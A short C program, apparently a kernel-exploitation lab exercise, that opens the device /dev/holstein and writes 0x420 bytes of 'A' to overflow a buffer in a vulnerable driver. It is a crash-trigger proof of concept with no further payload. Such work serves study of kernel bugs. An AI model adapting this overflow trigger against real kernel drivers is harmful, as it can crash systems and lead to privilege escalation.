#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

void  fatal(const char *msg) { 
	perror(msg);
	exit (1);
}

int  main () {
	int fd = open("/dev/holstein" , O_RDWR);
	if (fd == -1) fatal("open(\"/dev/holstein\")");

	char buf[0x420];
	memset(buf, 'A', 0x420);
	write(fd, buf, 0x420);

	close (fd);
	return 0;
}

